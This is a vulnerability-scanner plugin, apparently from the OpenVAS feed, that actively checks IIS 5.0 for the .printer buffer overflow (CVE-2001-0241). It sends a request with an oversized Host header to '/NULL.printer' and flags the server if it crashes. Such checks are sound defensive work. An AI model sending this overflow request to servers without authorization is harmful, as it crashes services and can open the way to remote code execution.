# SPDX-FileCopyrightText: 2001 John Lampe
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10657");
  script_version("2023-10-10T05:05:41+0000");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"IAVA", value:"2001-a-0005");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2674");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2001-0241");
  script_name("Microsoft NT IIS 5.0 Malformed HTTP Printer Request Header Buffer Overflow Vulnerability - Active Check");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2001 John Lampe");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the latest version.");

  script_tag(name:"summary", value:"There is a buffer overflow in the remote IIS web server.
  It is possible to overflow the remote Web server and execute commands as the SYSTEM user.");

  script_tag(name:"impact", value:"An attacker may make use of this vulnerability and use it to
  gain access to confidential data and/or escalate their privileges on the Web server.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

mystring = string("GET /NULL.printer HTTP/1.1\r\n");
mystring = string (mystring, "Host: ", crap(420), "\r\n\r\n");
mystring2 = http_get(item:"/", port:port);
soc = http_open_socket(port);
if(!soc)
  exit(0);

send(socket:soc, data:mystring);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port);
  exit(0);
}
